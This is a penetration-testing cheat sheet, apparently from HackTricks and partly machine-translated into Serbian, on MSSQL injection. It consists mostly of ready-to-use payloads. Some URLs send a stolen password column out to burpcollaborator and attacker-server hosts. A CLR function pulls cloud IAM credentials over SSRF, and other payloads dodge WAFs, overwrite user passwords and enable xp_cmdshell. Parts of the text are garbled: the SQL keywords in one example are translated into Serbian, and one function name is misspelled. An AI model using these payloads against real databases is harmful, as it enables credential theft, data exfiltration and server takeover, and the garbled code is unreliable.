# MSSQL Injection

{{#include ../../banners/hacktricks-training.md}}

## Active Directory enumeration

Može biti moguće **enumerisati korisnike domena putem SQL injekcije unutar MSSQL** servera koristeći sledeće MSSQL funkcije:

- **`SELECT DEFAULT_DOMAIN()`**: Dobijte trenutni naziv domena.
- **`master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))`**: Ako znate naziv domena (_DOMAIN_ u ovom primeru) ova funkcija će vratiti **SID korisnika Administratora** u heksadecimalnom formatu. Ovo će izgledati kao `0x01050000000[...]0000f401`, obratite pažnju na to kako su **poslednja 4 bajta** broj **500** u **big endian** formatu, što je **uobičajeni ID korisnika administratora**.\
Ova funkcija će vam omogućiti da **znate ID domena** (svi bajtovi osim poslednja 4).
- **`SUSER_SNAME(0x01050000000[...]0000e803)`** : Ova funkcija će vratiti **korisničko ime ID-a koji je naznačen** (ako postoji), u ovom slučaju **0000e803** u big endian == **1000** (obično je ovo ID prvog regularnog korisnika koji je kreiran). Tada možete zamisliti da možete brute-force korisničke ID-eve od 1000 do 2000 i verovatno dobiti sva korisnička imena korisnika domena. Na primer, koristeći funkciju poput sledeće:
```python
def get_sid(n):
domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
user = struct.pack('<I', int(n))
user = user.hex()
return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```
## **Alternativni vektori zasnovani na greškama**

SQL injekcije zasnovane na greškama obično liče na konstrukcije kao što su `+AND+1=@@version--` i varijante zasnovane na operatoru «OR». Upiti koji sadrže takve izraze obično su blokirani od strane WAF-ova. Kao zaobilaženje, konkatenirajte string koristeći %2b karakter sa rezultatom specifičnih poziva funkcija koje izazivaju grešku konverzije tipa podataka na traženim podacima.

Neki primeri takvih funkcija:

- `SUSER_NAME()`
- `USER_NAME()`
- `PERMISSIONS()`
- `DB_NAME()`
- `FILE_NAME()`
- `TYPE_NAME()`
- `COL_NAME()`

Primer korišćenja funkcije `USER_NAME()`:
```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/6.png)

## SSRF

Ove SSRF trikove [uzete su odavde](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

### `fn_xe_file_target_read_file`

Zahteva **`VIEW SERVER STATE`** dozvolu na serveru.
```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```
### `fn_get_audit_file`

Zahteva **`CONTROL SERVER`** dozvolu.
```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```
### `fn_trace_gettabe`

Zahteva **`CONTROL SERVER`** dozvolu.
```
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
```
### `xp_dirtree`, `xp_fileexists`, `xp_subdirs` <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a>

Skladišne procedure poput `xp_dirtree`, iako nisu zvanično dokumentovane od strane Microsoft-a, su opisane od strane drugih online zbog njihove korisnosti u mrežnim operacijama unutar MSSQL-a. Ove procedure se često koriste u Out of Band Data exfiltration, kao što je prikazano u raznim [primerima](https://www.notsosecure.com/oob-exploitation-cheatsheet/) i [postovima](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/).

Skladišna procedura `xp_dirtree`, na primer, se koristi za slanje mrežnih zahteva, ali je ograničena samo na TCP port 445. Broj porta nije moguće menjati, ali omogućava čitanje sa mrežnih deljenja. Korišćenje je prikazano u SQL skripti ispod:
```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\' + @user + '.attacker-server\\aa"');
```
Vredno je napomenuti da ova metoda možda neće raditi na svim sistemskim konfiguracijama, kao što je na `Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)` koji radi na `Windows Server 2016 Datacenter` sa podrazumevanim podešavanjima.

Pored toga, postoje alternativne skladišne procedure kao što su `master..xp_fileexist` i `xp_subdirs` koje mogu postići slične rezultate. Dodatne informacije o `xp_fileexist` mogu se naći u ovom [TechNet članku](https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx).

### `xp_cmdshell` <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a>

Očigledno možete koristiti **`xp_cmdshell`** da **izvršite** nešto što pokreće **SSRF**. Za više informacija **pročitajte relevantni odeljak** na stranici:

{{#ref}}
../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/
{{#endref}}

### MSSQL User Defined Function - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

Kreiranje CLR UDF (Common Language Runtime User Defined Function), što je kod napisan na bilo kom .NET jeziku i kompajliran u DLL, koji se učitava unutar MSSQL za izvršavanje prilagođenih funkcija, je proces koji zahteva `dbo` pristup. To znači da je obično izvodljivo samo kada je veza sa bazom podataka uspostavljena kao `sa` ili sa Administratorskom ulogom.

Visual Studio projekat i uputstva za instalaciju su dostupni u [ovoj Github repozitoriji](https://github.com/infiniteloopltd/SQLHttp) kako bi se olakšalo učitavanje binarnog fajla u MSSQL kao CLR assembly, čime se omogućava izvršavanje HTTP GET zahteva iz MSSQL-a.

Osnova ove funkcionalnosti je obuhvaćena u `http.cs` fajlu, koji koristi `WebClient` klasu za izvršavanje GET zahteva i preuzimanje sadržaja kao što je prikazano u nastavku:
```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
[Microsoft.SqlServer.Server.SqlFunction]
public static SqlString http(SqlString url)
{
var wc = new WebClient();
var html = wc.DownloadString(url.Value);
return new SqlString(html);
}
}
```
Pre nego što izvršite SQL komandu `CREATE ASSEMBLY`, preporučuje se da pokrenete sledeći SQL kod kako biste dodali SHA512 hash skupa u listu poverenih skupova na serveru (koja se može videti putem `select * from sys.trusted_assemblies;`):
```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```
Nakon uspešnog dodavanja skupa i kreiranja funkcije, sledeći SQL kod se može koristiti za izvršavanje HTTP zahteva:
```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```
### **Brza Eksploatacija: Preuzimanje Celog Sadržaja Tabele u Jednom Upitu**

[Trik odavde](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

Kratka metoda za ekstrakciju celog sadržaja tabele u jednom upitu uključuje korišćenje `FOR JSON` klauzule. Ovaj pristup je sažetiji od korišćenja `FOR XML` klauzule, koja zahteva specifičan režim poput "raw". `FOR JSON` klauzula se preferira zbog svoje sažetosti.

Evo kako da preuzmete šemu, tabele i kolone iz trenutne baze podataka:
````sql
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
In situations where error-based vectors are used, it's crucial to provide an alias or a name. This is because the output of expressions, if not provided with either, cannot be formatted as JSON. Here's an example of how this is done:

```sql
https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
````

### Retrieving the Current Query

[Trick from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

For users granted the `VIEW SERVER STATE` permission on the server, it's possible to see all executing sessions on the SQL Server instance. However, without this permission, users can only view their current session. The currently executing SQL query can be retrieved by accessing sys.dm_exec_requests and sys.dm_exec_sql_text:

```sql
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```

To check if you have the VIEW SERVER STATE permission, the following query can be used:

```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```

## **Little tricks for WAF bypasses**

[Tricks also from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

Non-standard whitespace characters: %C2%85 или %C2%A0:

```
https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
```

Scientific (0e) and hex (0x) notation for obfuscating UNION:

```
https://vuln.app/getItem?id=0eunion+select+null,@@version,null--

https://vuln.app/getItem?id=0xunion+select+null,@@version,null--
```

A period instead of a whitespace between FROM and a column name:

```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```

\N separator between SELECT and a throwaway column:

```
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```

### WAF Bypass with unorthodox stacked queries

According to [**this blog post**](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/) it's possible to stack queries in MSSQL without using ";":

```sql
SELECT 'a' SELECT 'b'
```

So for example, multiple queries such as:

```sql
koristi [tempdb]  
napravi tabelu [test] ([id] int)  
ubaci [test] vrednosti(1)  
izaberi [id] iz [test]  
izbaci tabelu [test]
```

Can be reduced to:

```sql
use[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```

Therefore it could be possible to bypass different WAFs that doesn't consider this form of stacking queries. For example:

```
# Dodavanje beskorisnog exec() na kraju i navođenje WAF-a da misli da ovo nije važeća upit
admina'union select 1,'admin','testtest123'exec('select 1')--
## Ovo će biti:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# Korišćenje čudno konstruisanih upita
admin'exec('update[users]set[password]=''a''')--
## Ovo će biti:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# Ili omogućavanje xp_cmdshell
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## Ovo će biti
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

## References

- [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
- [https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)

{{#include ../../banners/hacktricks-training.md}}
